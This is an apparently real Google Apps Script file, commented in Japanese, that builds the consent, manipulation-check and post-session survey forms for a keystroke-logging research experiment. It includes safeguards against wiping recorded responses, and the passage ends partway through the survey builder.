/**
 * GSE G1 統制タスク実験 — Google Form ビルダー（3 フォームを 1 本にまとめる）
 *
 * 真実源:
 *   experiments/20260801-controlled-friction-task/preregistration.md（凍結・§2.6 / §2.8 / §2.10）
 *   experiments/20260801-controlled-friction-task/consent.md（同意文面の真実源）
 *   experiments/20260801-controlled-friction-task/protocol.md（進行）
 *   .steering/20260802-g1-execution-prep/decisions.md E-11（フォーム方式の採用）
 *
 * ★ このファイルは**配布と記録の手段**であって、文面の真実源ではない。
 *   文面を変えるときは consent.md を先に直し、ここへ写す（逆をやらない）。
 *
 * ============================================================================
 * ⚠️⚠️ 3 フォームは制約が正反対である。取り違えると実験が壊れる。
 * ============================================================================
 *
 *              | G1-C 同意          | G1-M 強制比較            | G1-S 終了後アンケート
 *   -----------+--------------------+--------------------------+----------------------
 *   いつ       | 開始前・1 回       | ブロック 3〜9 の直後・7回 | 最後の copy の後・1 回
 *   PII        | 氏名・メール       | ★ 被験者 ID のみ         | ★ 被験者 ID のみ
 *   形式       | 必須チェック＋記名 | ★ 二択のみ               | 二択＋自由記述
 *   禁止       | どのブロックが難しい条件か（protocol.md §4.3）
 *              |                    | ★ HI / LO の語           | ★ HI / LO の語
 *   所要       | 余裕をもって       | ★ 1 分休憩に収まること   | 5 分程度
 *
 * ★ **「1〜5 のリッカート」を G1-M に入れてはならない**（preregistration.md §2.6）。
 *   Phase1 の straight-lining（P013 の Q1 が全て "1"）が GATE3 を DataInsufficient にした
 *   近因であり、同じ計器を使わない。強制比較（二択・「どちらでもない」なし）だけを使う。
 *
 * ============================================================================
 * ⚠️ 固定 ID 方式（FormApp.create を使わない）
 * ============================================================================
 * Phase1 で `FormApp.create` が実行のたびに別フォームを量産し、被験者に配った短縮 URL が
 * 指すフォームと集計が読むフォームがズレて「回答が記録されない」不具合を起こした。
 * → **必ず先に Google Forms で空フォームを 3 つ作り、その編集 URL の ID をここに書く。**
 *    docs.google.com/forms/d/<ここ>/edit の <ここ>。空のままだと各 build は停止する。
 */

// ============================================================
// 設定（★ 実行前に埋める）
// ============================================================
// ★ 研究者が 2026-08-03 に作成した空フォーム 3 本を割り当てた（Phase1 と同じく .gs に置く規約）。
// ⚠️ 3 本とも**空フォーム**なので、どれがどの役割になるかは**この割り当てが決める**。
//    setupG1Forms() を実行すると、各フォームにタイトル・説明・設問が書き込まれる。
//    ★ 一度でも被験者に URL を配ったら、**この割り当てを入れ替えてはならない**
//      （配った URL が別のフォームを指すことになる — Phase1 の量産バグと同じ壊れ方）。
var FORM_ID_CONSENT = "1Hs3NtuOB3IRKHaU6xspL8jd1y4BdVKFK0s4JxHTQdsE"; // G1-C 説明・同意（form1）
var FORM_ID_MCHECK = "1iDcr0uc_51dEEI_idyJhcozYMX02N3ug-JQ7zSVMHIA"; // G1-M 強制比較（form2）
var FORM_ID_SURVEY = "1ScM_420irB8DUA8EFYyDJBaPBR-_lOa4evtveQBVWjU"; // G1-S 終了後アンケート（form3）

// 既存設問を毎回作り直すか（通常 true）。
var CLEAR_EXISTING = true;

// ★★ 回答があるフォームを作り直してよいか（既定 false = fail-closed）。
//
// ⚠️★ **2026-08-07 の事故を受けて追加した。** 実際に起きたこと:
//    「回答を保全する」と決めていたのに、Apps Script の関数セレクタの選択が反映されないまま
//    `setupG1Forms` を実行してしまい、`buildConsentForm()` が `clearForm()` で全設問を削除した。
//    → G1-C の**回答レコード 3 件は残ったが、答えがどの設問のものか失われた**
//      （要約・個別のどちらも「回答なし」表示になった。★ 実測で確認）。
//    ⚠️ ★ **Forms に回答の版履歴は無い。取り返しがつかない。**
//
// ★ 教訓: 「気をつける」では防げない。**コード側で止める。**
//    人間の 1 クリックのミスが同意記録を壊せる設計そのものが欠陥だった。
//
// ★ 意図して作り直すときだけ true にし、⚠️ **作業が終わったら false に戻す**。
//    → 回答を保ったまま文面を更新したいときは `migrateConsentForm()` を使う（削除しない）。
var ALLOW_REBUILD_WITH_RESPONSES = false;

// ★ clearForm() の直前に必ず通す関門。⚠️ **黙って進めない**（`data-privacy` / 研究記録の保全）。
function assertSafeToRebuild_(form, label) {
  var n;
  try {
    n = form.getResponses().length;
  } catch (e) {
    // ★ 回答数を確認できないなら **安全側に倒して止める**。
    //   ⚠️ 「確認できなかった」を「0 件」と読み替えない（silent-failure 型の典型）。
    throw new Error(
      "★ " + label + " の回答数を確認できませんでした: " + e + "\n" +
        "⚠️ 確認できない以上、作り直しません（fail-closed）。"
    );
  }
  if (n === 0) return;

  if (ALLOW_REBUILD_WITH_RESPONSES) {
    Logger.log(
      "⚠️⚠️ " + label + ": 回答が " + n + " 件あるが ALLOW_REBUILD_WITH_RESPONSES=true のため作り直します。\n" +
        "   ★ この操作で **回答と設問の紐付けが失われます**。作業後は必ず false に戻してください。"
    );
    return;
  }

  throw new Error(
    "⛔ " + label + " には既に回答が " + n + " 件あります。作り直しを中止しました（fail-closed）。\n" +
      "\n" +
      "★ 回答を保ったまま文面を更新したい場合（ほぼ常にこちら）:\n" +
      "    migrateConsentForm()  … 既存設問を消さず、足りない項目だけを挿入する\n" +
      "    checkConsentFormParity()  … 実フォームとコードのズレを読み取り専用で報告する\n" +
      "\n" +
      "⚠️ どうしても作り直す場合は ALLOW_REBUILD_WITH_RESPONSES = true にしてから再実行し、\n" +
      "   ★ **回答と設問の紐付けが失われることを承知したうえで**行ってください。\n" +
      "   （2026-08-07 に実際にこれを事故で起こしています。Forms に版履歴はありません。）"
  );
}

// 問い合わせ先（PII ではないのでここに置いてよい）。
var CONTACT_EMAIL = "mmiura.network@gmail.com";

// G1 運用管理シートの ID を覚えておく Script Property キー。
// ⚠️ Phase1 の GSE_MGMT_SHEET_ID とは**別のキー**（別シート）。ただし P-ID は共有する（下記）。
var MGMT_SHEET_PROP_G1 = "GSE_G1_MGMT_SHEET_ID";

// ============================================================
// ★★ P-ID は Phase1 と共有する（研究者判断 2026-08-03）
// ============================================================
// 同じ人には同じ P-ID を使う。1 人の人間に 2 つの識別子を作らない。
//
// ★ したがって **本ファイルは P-ID を採番しない**。採番元は
//   `Form_Phase1/GSE_Phase1_Form_Builder.gs` の `addParticipant()` /
//   Phase1 運用管理シートの「参加者ロスター」**ただ 1 つ**である。
//   ⚠️ 2 か所で採番すると必ず衝突する（別シートを走査しても相手の最大値が見えないため）。
//   新規の被験者が来たら **Phase1 側で採番してから** G1 を回すこと。
//
// ★ 同じ理由で、本シートは **実名・メールを持たない**。実名↔P-ID の対応表を 2 か所に作らない
//   (data-privacy)。G1 の同意フォーム(G1-C)の回答シートと Phase1 のロスターに既にある。
//
// ⚠️⚠️ **ID 共有の帰結（必ず読む）**: G1 は第 1 週(blind 較正)モードで回すため
//   session_meta に condition=blind_calibration / label_pool=calibration_blind が刻まれ、
//   **Phase1 の較正セッションと同じラベル**になる（data.md の B-4）。
//   ID まで同じにすると、**ID 範囲による分離が使えなくなる**。
//   → 分離は次の 2 つだけが担う。どちらも省略しないこと:
//     1. `blocks/P0xx.json` の `file` 列（どの NDJSON が G1 のブロックかを列挙している）
//     2. gse-dataset への送付時に **G1 のセッションであることを明示**する（data.md の送付フロー）

// ============================================================
// ★ 設問タイトルの契約（forms_to_blocks.py がこの語で列を探す）
// ============================================================
// ⚠️ ここを変えたら `experiments/20260801-controlled-friction-task/forms_to_blocks.py` の
//    HEADER_KEYS も同じ版に直すこと。**文書だけ直して実装が追随しない**事故が
//    このプロジェクトで 2 回起きている（decisions.md E-6 / E-7）。
var Q_SUBJECT_ID = "被験者ID";

// ★★ §2.12-4: 当日より前に中を見たかを G1-S で記録する。
//    ⚠️ **判定に使わない・除外にも使わない**（§3.6 無変更）。§3.8 の限界の記述に使う。
// ★★ 2026-08-08（第 11 版）: 事前開示を撤回したので、聞き方を
//    「どのくらい読んだか」→「**当日より前に開いたか**」に変えた。
//    ⚠️ ★ **設問自体は残す。** 撤回は抑止であって保証ではなく（押せば読める）、
//       「事前に見た人はいない」を前提に置けないため。★ 測るという解き方を維持する。
var Q_S_PREREAD =
  "当日より前に、課題ページの「課題を表示して始める」を押して中をご覧になりましたか。";
var Q_S_PREREAD_NOTE = "ご覧になった場合、書く内容も考えておかれましたか（任意）。";
var Q_BLOCK_NO = "ブロック番号";
var Q_HARDER = "より詰まったのはどちらですか";
// 二択の選択肢文字列（相対表現。★ ブロック番号を被験者に計算させない）。
var CHOICE_PREV = "1つ前のブロックのほう";
var CHOICE_CURRENT = "直前のブロックのほう";

// ============================================================
// 入口
// ============================================================
function setupG1Forms() {
  buildConsentForm();
  buildManipulationCheckForm();
  buildPostSurveyForm();
  // ★ 短縮 URL は任意。XGD_API_KEY が未設定なら何もしない（実施に支障は無い）。
  //   管理シートより先に呼ぶ — リンク集タブが短縮 URL を読むため。
  shortenFormUrls();
  var url = buildManagementSheet();
  Logger.log("🎉 G1 フォーム 3 本 ＋ 管理シート 作成完了: " + url);
  Logger.log(listG1FormUrls());
  if (!G1_CONTACT) {
    Logger.log("⚠️ ★ G1_CONTACT が空です。受付メールは送れません（fail-closed）。");
  }
  if (!PHASE1_MGMT_SHEET_ID) {
    Logger.log("⚠️ ★ PHASE1_MGMT_SHEET_ID が空です。P-ID の採番ができません（採番元は Phase1 のロスター）。");
  }
}

function listG1FormUrls() {
  var props = PropertiesService.getScriptProperties();
  var out = [];
  ["G1_CONSENT", "G1_MCHECK", "G1_SURVEY"].forEach(function (key) {
    var raw = props.getProperty("FORMURL_" + key);
    if (!raw) {
      out.push(key + ": (未生成)");
      return;
    }
    var o = JSON.parse(raw);
    var shortUrl = getShortUrl_(props, key);
    out.push(
      key + ": " + o.label +
        "\n  回答: " + o.publishedUrl +
        (shortUrl ? "\n  短縮: " + shortUrl : "") +
        "\n  編集: " + o.editUrl
    );
  });
  return out.join("\n");
}

// ★ G1-C の設問タイトル。**回答取得（onG1ConsentSubmit）と共有する**。
//   ⚠️ 片方だけ変えると、提出されても氏名やメールが取れずに黙って発番が止まる。
var Q_C_PID = "参加者ID（お持ちの方のみ）";
var Q_C_NAME = "お名前";
var Q_C_EMAIL = "メールアドレス";

// ============================================================
// G1-C 同意フォーム（consent.md が文面の真実源）
// ============================================================
// ★★ 説明文と同意項目は **この 2 つの関数だけが真実源**である。
//   ⚠️ buildConsentForm()（新規構築）と migrateConsentForm()（既存フォームへの差分適用）の
//      両方がここを見る。★ **文面を 2 か所に書かない。**
//      このプロジェクトは「片方だけ直して食い違わせる」事故を繰り返している。
//   ⚠️ 文面の真実源はさらに上流の consent.md である（先に consent.md を直し、ここへ写す）。
function consentFormTitle_() {
  return "GSE G1 統制タスク実験 — 説明・同意";
}

function consentFormDescription_() {
  return (
    "ご協力ありがとうございます。以下をお読みのうえ、ご回答ください。\n\n" +
      "▼ 何を調べる研究か\n" +
      "キーボードの打ち方から「作業がどれくらい詰まっているか」を推定できるかを調べています。" +
      "今回は難しさの違う書く課題を用意し、打ち方の違いが出るかを確かめます。\n\n" +
      "▼ お願いすること（約 70 分）\n" +
      "・全部で 10 ブロックあります。1 ブロックは 5 分、間に 1 分の休憩があります。\n" +
      "・★ 最初と最後の 1 ブロックずつは「書き写し」の課題です。考える必要はありません。\n" +
      "  これは計測器がちゃんと動いているかを確かめるための課題で、隠していることはありません。\n" +
      "・残りの 8 ブロックが本番です。資料を読んで 300〜400 字の文章を書いてもらいます。\n" +
      "・8 ブロックのうち 7 回、「直前のブロックと 1 つ前のどちらが詰まったか」を 1 つ選んでもらいます。\n" +
      "・★ 文章はこの実験専用の記入画面に打っていただきます（全員・毎回同じ画面／本文は保存されません）。\n" +
      "・★ 最後に短いアンケート（5 分ほど）にお答えいただきます。手続きの改善と記録のためのもので、" +
      "実験の判定には使いません。\n\n" +
      "▼ 記録するもの\n" +
      "・キーを押した時刻（ミリ秒）とキーの種類（文字キー / バックスペース / 空白 / 改行 など）\n" +
      "・日本語入力の変換にかかった時間\n" +
      "・貼り付けの回数と文字数（中身は取得しません）\n" +
      "・★ 記録を送った日時と、送信が成功したかどうか\n" +
      "・★ 1 分ごとの「短い中断」の回数と合計時間（30 秒より短いもの・計測中のみ）\n" +
      "  ※「席にいるか」の判断にマウス等の操作も使いますが、マウスの動きは記録しません。\n" +
      "  ※ 何にも触れずに考えている時間は、ここにはほとんど数えられません。\n" +
      "・★ アプリの版（例: 0.1.26）\n\n" +
      "▼ 記録しないもの（一切保存されません）\n" +
      "・★ あなたが書いた文章そのもの（実験者が文字数だけを数えます）\n" +
      "・どの文字を打ったか（本文の復元はできません）\n" +
      "・画面の内容・ウィンドウのタイトル・アプリ名・音声・映像\n" +
      "・マウスの動きそのもの・中断の理由や中身\n" +
      "・★ 位置情報・端末の中の他のファイル・端末を特定できる情報（機体番号・ホスト名など）\n\n" +
      "▼ ★ 記録の送られ方（毎回、あなたに確認します）\n" +
      "・★ 1 つのブロック（5 分）が終わるたびに、画面に「このブロックの記録を送信しますか？」と\n" +
      "  出ます。「送信する」を押したときだけ、その記録が研究者に送られます。\n" +
      "  ★ 押さない限り送られません。「あとで」を選ぶこともできます。\n" +
      "・★ 「あとで」を選んでも記録は消えません。端末に残るので、次のブロックの後にまとめて\n" +
      "  送れます。★ ただし最後まで送信しなければ研究者には届きません（端末に残るだけです）。\n" +
      "  その場合は研究者が後で直接受け取ります。\n" +
      "・★ 送られるのは暗号化されたファイルだけです。中身は研究者の鍵でしか開けません。\n" +
      "  途中で通る場所（インターネット上のサービス）では誰も中身を読めません。\n" +
      "・★ 送られるファイルに、あなたが書いた文章は入っていません。どの文字を押したかは、\n" +
      "  送られる前に「文字キー / バックスペース / 空白」のような種類に置き換えられます。\n" +
      "・送り先は研究者が管理する Google ドライブです（途中で Google のサービスを経由します）。\n" +
      "・送信のときに研究者の手元に残るのは「いつ送られたか」と「送れたかどうか」だけで、\n" +
      "  あなたの端末やアカウントを特定する情報は残りません。ただし、途中で通る Google の\n" +
      "  サービスが内部で何を記録しているかは研究者には確認できません（一般的なインターネット\n" +
      "  利用と同じです）。\n" +
      "・★ インターネットに接続していないと送れません。そのときは記録が端末に残り、あとで\n" +
      "  自動的に送り直します（送信を一度確認したものは、あらためて押す必要はありません）。\n" +
      "  画面に「まだ送れていない件数」が出ます。0 にならないまま\n" +
      "  終わった場合は研究者にお知らせください（記録は端末に残っています）。\n" +
      "・★ 送ったあとも、同じ記録があなたの端末に残ります。勝手に消すことはしません。\n" +
      "・★ なぜこの形にするのか: 予備の実施で、記録の一部が失われたことがありました。\n" +
      "  あなたの手間を省くためではなく、記録を確実に残すために、記録そのものは自動で\n" +
      "  作られます（ここは操作不要です）。★ ただし研究者へ送るかどうかは毎回あなたが決めます。\n\n" +
      "▼ リスクと負担\n" +
      "・身体的なリスクはありません。約 70 分の拘束と、書く作業による軽い疲労が負担です。\n" +
      "・★ 難しく感じるブロックがあります。それは設計上わざとそうしてあります。\n" +
      "  うまく書けなくても能力の評価ではありません。採点も比較もしません。\n\n" +
      "▼ 参加は任意です\n" +
      "断っても不利益はありません。途中でやめられ、理由の説明も要りません。" +
      "後からデータの削除を求められます（★ すでに送信されたものも対象です。" +
      "ただし公表済みの集計から個別に取り除くことはできません）。\n" +
      "・★ 送信をやめたいときは、確認の画面で「あとで」を選んでください。それだけで送られません" +
      "（記録は端末に残ります）。以後もずっと送りたくない場合は研究者にお知らせください。" +
      "送信を止める設定にしたうえで、記録を端末に残したまま進めることができます" +
      "（記録は研究者が後で直接受け取ります）。" +
      "★ 設定の変更は研究者が行いますので、お申し出からお手続きまでに時間がかかることがあります。\n\n" +
      "▼ 結果の使われ方\n" +
      "個人が特定できる形では公表しません。分析スクリプトや集計結果は公開される可能性がありますが、" +
      "そこに含まれるのは P0xx という記号と数値だけで、氏名・実施日時・本文は含みません。\n\n" +
      "▼ お問い合わせ先\n" +
      CONTACT_EMAIL
  );
}

// ★ consent.md の同意欄 8 項目をそのまま設問化する。★ **順序が意味を持つ**（挿入位置の基準）。
//   ⚠️ 2 と 3 は G1 固有（欺瞞を用いない・preregistration.md §2.8）。落とさないこと。
//   ⚠️ ★ 自動送信の 1 項目は 2026-08-07 に追加した（研究者判断 D-1 / D-4）。
//      consent.md 同意欄 / protocol.md §4.1-1 / 本ファイルの 3 箇所を同時に直すこと。
function consentItemTitles_() {
  return [
    "上の説明を読み、質問する機会がありました。",
    "★ 最初と最後のブロックが「書き写し」であることの説明を受けました。",
    "★ 一部のブロックが意図的に難しく作られていることの説明を受けました。",
    "書いた文章は保存されないことを理解しました。",
    "★ 最後に短いアンケートがあり、それは実験の判定には使われないことの説明を受けました。",
    "いつでも中断でき、後からデータの削除を求められることを理解しました。",
    "★ ブロックごとに送信の確認画面が出て、「送信する」を押したときだけ暗号化された記録がインターネット経由で送られることの説明を受けました。",
    "打鍵の記録（本文を除く）と、その研究利用に同意します。",
  ];
}

function buildConsentForm() {
  var form = openFixed_(FORM_ID_CONSENT, "FORM_ID_CONSENT");
  if (CLEAR_EXISTING) {
    assertSafeToRebuild_(form, "G1-C 説明・同意");
    clearForm(form);
  }

  form.setTitle(consentFormTitle_());
  form.setDescription(consentFormDescription_());
  form.setCollectEmail(false); // 下の設問で明示的に取る（何を取るかを本人に見せる）
  form.setShowLinkToRespondAgain(false);
  // ★ 募集でも当日でも使える文言にする（当日は実験者が同席している）。
  form.setConfirmationMessage(
    "ご回答ありがとうございます。参加者ID と当日のご案内をメールでお送りします。\n" +
      "（その場でご回答いただいた場合は、実験者にお知らせください。）"
  );

  addSectionHeader(
    form,
    "同意の確認",
    "以下のすべてに同意いただける場合のみ、参加をお願いします。"
  );

  consentItemTitles_().forEach(function (title) {
    var q = form.addCheckboxItem();
    q.setTitle(title);
    q.setChoices([q.createChoice("同意する / 理解した")]);
    q.setRequired(true);
  });

  addSectionHeader(
    form,
    "ご記名",
    "撤回のお申し出を受け付けるために必要です。ログとは別に保管し、P0xx とのみ結び付けます。"
  );
  // ★ P-ID は Phase1 と共有する（同じ人＝同じ ID）。以前ご参加の方は既にお持ちなので書いてもらう。
  //   ⚠️ 必須にしない — 初参加の方は持っていない（その場合は実験者が Phase1 側で採番する）。
  var pid = form.addTextItem();
  pid.setTitle(Q_C_PID);
  pid.setHelpText(
    "以前 GSE の検証にご参加いただいた方は、そのときお伝えした P から始まる記号をご記入ください。" +
      "初めての方は空欄で構いません。"
  );
  form.addTextItem().setTitle(Q_C_NAME).setRequired(true);
  var mail = form.addTextItem();
  mail.setTitle(Q_C_EMAIL);
  mail.setRequired(true);
  mail.setValidation(FormApp.createTextValidation().requireTextMatchesPattern(".+@.+").build());


  recordFormUrl_("G1_CONSENT", form, "G1-C 説明・同意");
  Logger.log("G1-C 同意フォームを構築した: " + form.getPublishedUrl());
}

// ============================================================
// ★★ G1-C を「作り直さずに」最新の文面へ揃える（差分適用・2026-08-07）
// ============================================================
// ⚠️ ★ **buildConsentForm() は CLEAR_EXISTING=true で全設問を削除して作り直す。**
//    公開済みフォームに既存回答があるとき、それをやると
//    **どの回答がどの設問へのものだったかが失われる**（同意記録なので取り返しがつかない）。
//    → ★ 本関数は **既存項目を消さず、足りないものだけを正しい位置に挿入する**。
//
// ★ 何度実行しても同じ状態になる（idempotent）:
//    - 既に在る同意項目は**触らない**（title 一致で判定）
//    - 無い項目だけを consentItemTitles_() の順序どおりの位置に挿入する
//    - 説明文・題名は毎回 consentFormDescription_() / consentFormTitle_() で上書きする
//
// ⚠️ ★ **設問の削除は一切行わない。** consentItemTitles_() から項目を消したとしても、
//    本関数は実フォームから消さない。★ 消すのは人間の判断であり、
//    「回答が消える操作」を自動化しない（`data-privacy` / 研究記録の保全）。
//    → 余分な項目が残っていないかは checkConsentFormParity() が**報告**する。
function migrateConsentForm() {
  var form = openFixed_(FORM_ID_CONSENT, "FORM_ID_CONSENT");

  form.setTitle(consentFormTitle_());
  form.setDescription(consentFormDescription_());

  var wanted = consentItemTitles_();
  var inserted = [];

  wanted.forEach(function (title, wantedIdx) {
    if (findItemByTitle_(form, title)) return; // 既に在る → 触らない

    // ★ 挿入位置: 「自分より前に在るべき項目」のうち実在する最後のものの直後。
    //   ⚠️ 実フォームの index で数える（コード側の配列 index で数えない）。
    //   ★ これが `runCol_` 型の「コード側だけ見て実物を見ない」バグの回避である。
    var anchorIndex = -1;
    for (var k = 0; k < wantedIdx; k++) {
      var prev = findItemByTitle_(form, wanted[k]);
      if (prev) anchorIndex = prev.getIndex();
    }
    if (anchorIndex < 0) {
      // 前に置くべき項目が 1 つも無い → 「同意の確認」セクションの直後に置く
      var header = findItemByTitle_(form, "同意の確認");
      anchorIndex = header ? header.getIndex() : 0;
    }

    var q = form.addCheckboxItem();
    q.setTitle(title);
    q.setChoices([q.createChoice("同意する / 理解した")]);
    q.setRequired(true);
    form.moveItem(q.getIndex(), anchorIndex + 1);
    inserted.push(title);
  });

  Logger.log(
    "G1-C を差分適用した: 挿入 " + inserted.length + " 件" +
      (inserted.length ? "\n  + " + inserted.join("\n  + ") : "（説明文の更新のみ）")
  );
  checkConsentFormParity(); // ★ 自分でログに出すので Logger.log で包まない (二重に出る)
  return inserted;
}

function findItemByTitle_(form, title) {
  var items = form.getItems();
  for (var i = 0; i < items.length; i++) {
    if (items[i].getTitle() === title) return items[i];
  }
  return null;
}

// ★★ 実フォームとコードのズレを **実物を読んで** 報告する（`browser-verification` §3）。
//    ⚠️ コード側の配列を数えるだけの検査は、コードと外界のズレを原理的に検出できない。
//    ★ 「順序」まで見る。⚠️ 同意項目は順序が意味を持つ（consent.md の並びと対応させる）。
function checkConsentFormParity() {
  var form = openFixed_(FORM_ID_CONSENT, "FORM_ID_CONSENT");
  var wanted = consentItemTitles_();
  var lines = [];

  var missing = wanted.filter(function (t) {
    return !findItemByTitle_(form, t);
  });
  if (missing.length) lines.push("❌ 不足 " + missing.length + " 件:\n  - " + missing.join("\n  - "));

  // 実フォーム上でのチェックボックス設問の並び（= 被験者が見る順序）
  var actual = form
    .getItems(FormApp.ItemType.CHECKBOX)
    .map(function (it) {
      return it.getTitle();
    });
  var extra = actual.filter(function (t) {
    return wanted.indexOf(t) < 0;
  });
  if (extra.length) {
    lines.push(
      "⚠️ コードに無い設問が実フォームに " + extra.length + " 件ある（★ 自動では消さない）:\n  - " +
        extra.join("\n  - ")
    );
  }

  var actualWanted = actual.filter(function (t) {
    return wanted.indexOf(t) >= 0;
  });
  if (actualWanted.join("") !== wanted.join("")) {
    lines.push("❌ 順序がコードと一致しない:\n  実物: " + actualWanted.join(" / ") + "\n  期待: " + wanted.join(" / "));
  }

  var descOk = form.getDescription() === consentFormDescription_();
  if (!descOk) lines.push("❌ 説明文がコードと一致しない");

  var n = form.getResponses().length;
  var msg = !lines.length
    ? "✅ G1-C はコードと一致している（同意項目 " + wanted.length + " 件・既存回答 " + n + " 件）"
    : "G1-C parity（既存回答 " + n + " 件）\n" + lines.join("\n");
  // ⚠️★★ **自分でログに出す。** 戻り値だけだと、エディタから ▶ で単独実行したときに
  //   実行ログが「実行開始 / 実行完了」だけになり、★ **判定が 1 文字も見えない**。
  //   （2026-08-07 に実際に起きた: 研究者が単独実行し、空ログを見て「通った」と読みかけた）
  //   ★ 手順書は「ログに ✅ が出ることを確認」と書いているので、コードをそれに合わせる。
  Logger.log(msg);
  return msg;
}

// ============================================================
// G1-M 強制比較フォーム（preregistration.md §2.6・★ 7 回答える）
// ============================================================
function buildManipulationCheckForm() {
  var form = openFixed_(FORM_ID_MCHECK, "FORM_ID_MCHECK");
  if (CLEAR_EXISTING) {
    assertSafeToRebuild_(form, "G1-M 強制比較");
    clearForm(form);
  }

  form.setTitle("GSE G1 — ブロック直後の 1 問");
  form.setDescription(
    "各ブロックが終わったら、そのブロックについて 1 問だけ答えてください。\n\n" +
      "★ 「どちらでもない」はありません。どちらか一方を必ず選んでください。\n" +
      "★ 良し悪しを聞いていません。詰まった感じがどちらで強かったかだけを答えてください。"
  );
  form.setCollectEmail(false); // ★ PII を取らない（被験者 ID のみ）
  // ★ 7 回答えるので「もう一度回答」リンクを残す。ブラウザを開き直す時間が休憩に収まらない。
  form.setShowLinkToRespondAgain(true);
  form.setConfirmationMessage("ありがとうございます。次のブロックまでお待ちください。");

  var sid = form.addTextItem();
  sid.setTitle(Q_SUBJECT_ID);
  sid.setHelpText("実験者から伝えられた P から始まる記号（例: P015）");
  sid.setRequired(true);
  sid.setValidation(FormApp.createTextValidation().requireTextMatchesPattern("P[0-9]+").build());

  // ★ ブロック番号は 3〜9 のみ。copy（1・10）と G1 の最初（2）には比較対象が無い（§2.6）。
  var blk = form.addMultipleChoiceItem();
  blk.setTitle(Q_BLOCK_NO);
  blk.setHelpText("いま終わったブロックの番号を選んでください。");
  blk.setChoices(
    [3, 4, 5, 6, 7, 8, 9].map(function (n) {
      return blk.createChoice(String(n));
    })
  );
  blk.setRequired(true);

  // ★ 二択のみ。★ 選択肢を**相対表現**にして、被験者にブロック番号を計算させない。
  //   （番号を答えさせると 1 つずれた転記が起きうる。ここは protocol.md §3.1 の紙と同じ文言。）
  var harder = form.addMultipleChoiceItem();
  harder.setTitle(Q_HARDER);
  harder.setHelpText(
    "いま終わったブロックと、その 1 つ前のブロックを比べてください。" +
      "より「詰まった / 手が止まった」のはどちらでしたか。"
  );
  harder.setChoices([harder.createChoice(CHOICE_PREV), harder.createChoice(CHOICE_CURRENT)]);
  harder.setRequired(true);

  recordFormUrl_("G1_MCHECK", form, "G1-M 強制比較（ブロック 3〜9 の直後）");
  Logger.log("G1-M 強制比較フォームを構築した: " + form.getPublishedUrl());
}

// ============================================================
// G1-S 終了後アンケート（preregistration.md §2.10・★ 判定には使わない）
// ============================================================
function buildPostSurveyForm() {
  var form = openFixed_(FORM_ID_SURVEY, "FORM_ID_SURVEY");
  if (CLEAR_EXISTING) {
    assertSafeToRebuild_(form, "G1-S 終了後アンケート");
    clearForm(form);
  }

  form.setTitle("GSE G1 — 終了後アンケート");
  form.setDescription(
    "お疲れさまでした。最後にいくつか伺います。\n\n" +
      "★ この回答は**実験の判定には使いません**（判定は打鍵の記録だけで行います）。" +
      "手続きの改善と、記録のために伺うものです。正解はありません。\n" +
      "答えたくない設問は飛ばして構いません。"
  );
  form.setCollectEmail(false); // ★ PII を取らない（被験者 ID のみ）
  form.setShowLinkToRespondAgain(false);
  form.setConfirmationMessage("ご協力ありがとうございました。");

  var sid = form.addTextItem();
  sid.setTitle(Q_SUBJECT_ID);
  sid.setRequired(true);
  sid.setValidation(FormApp.createTextValidation().requireTextMatchesPattern("P[0-9]+").build());

  // --- 1. デブリーフ / demand characteristics -------------------------------
  addSectionHeader(form, "1. この実験について", "思ったままで構いません。");
  form.addParagraphTextItem().setTitle("この実験は何を測っていると思いましたか。");
  var noticed = form.addMultipleChoiceItem();
  noticed.setTitle("ブロックによって難しさが違うと感じましたか。");
  noticed.setChoices([noticed.createChoice("感じた"), noticed.createChoice("感じなかった")]);
  form
    .addParagraphTextItem()
    .setTitle("そう感じた場合、どのあたりが違うと思いましたか（任意）。");

  // --- 1b. ★★ 当日より前に中を見たか（§2.12-4）-----------------------------
  // ⚠️★ **判定に使わない。除外にも使わない**（§3.6 無変更）。§3.8 の限界の記述に使う。
  //    ★★ 2026-08-08（第 11 版）: 事前開示を**撤回した**。
  //    ⚠️ ★ それでもこの設問は残す。撤回は**抑止であって保証ではない**からである:
  //       無人在宅では blockNN.html を当日より前に手元へ渡すしかなく、
  //       ページの「課題を表示して始める」を押せば中は読める。
  //       → 「事前に見た人はいない」を前提に置けない。★ **測って報告する**。
  //    ⚠️ ★ **自己申告であり検証できない**ことも §3.8 に書いてある。
  addSectionHeader(
    form,
    "1b. 当日より前に開いたかどうか",
    "★ 正解はありません。**開いていても、開いていなくても全く問題ありません。**\n" +
      "⚠️ この回答で参加者を除外したり、評価を変えたりすることはありません。"
  );
  var preread = form.addMultipleChoiceItem();
  preread.setTitle(Q_S_PREREAD);
  preread.setChoices([
    preread.createChoice("押していない（当日が初めて）"),
    preread.createChoice("押したが、ほとんど読まなかった"),
    preread.createChoice("押して、一通り読んだ"),
    preread.createChoice("押して読んだうえで、書く内容も考えておいた"),
  ]);
  preread.setRequired(true);
  form.addParagraphTextItem().setTitle(Q_S_PREREAD_NOTE);

  // --- 2. ★ B-1 の実測（プローブが本当に出なかったか）----------------------
  // preregistration.md §2.6 は「アプリ内プローブを使わない」と凍結し、§5.4 の kill switch で
  // 止めている。★ ここは**主観側の裏取り**であり、客観検証は NDJSON 側で行う
  // （validate_blocks.py --dataset が probe_assignment 行 0 を検査する）。
  addSectionHeader(form, "2. アプリの挙動について", "気づいたことを教えてください。");
  var popup = form.addMultipleChoiceItem();
  popup.setTitle("書いている最中に、アプリから質問やお知らせが表示されましたか。");
  popup.setChoices([
    popup.createChoice("一度も出なかった"),
    popup.createChoice("出た"),
    popup.createChoice("覚えていない"),
  ]);
  popup.setRequired(true);
  form.addTextItem().setTitle("「出た」場合、だいたい何回でしたか（任意）。");

  // --- 3. 手続きの改善（§2.8 が改訂を許容する範囲）--------------------------
  addSectionHeader(form, "3. 課題と進め方について", "次回の改善に使います。");
  var len = form.addMultipleChoiceItem();
  len.setTitle("1 ブロック 5 分という長さはどうでしたか。");
  len.setChoices([len.createChoice("短い"), len.createChoice("ちょうどよい"), len.createChoice("長い")]);
  var amount = form.addMultipleChoiceItem();
  amount.setTitle("配られた資料の量はどうでしたか。");
  amount.setChoices([
    amount.createChoice("少ない"),
    amount.createChoice("ちょうどよい"),
    amount.createChoice("多い"),
  ]);
  form.addParagraphTextItem().setTitle("分かりにくかった課題文があれば教えてください（任意）。");

  // --- 4. ★ 入力パッドについて（B-5 の実測）--------------------------------
  // 入力先を固定したこと自体が統制である（bs_rate の汚染防止）。使い勝手が悪ければ
  // 統制を保ったまま直す必要があるので、P-1 で必ず聞く。
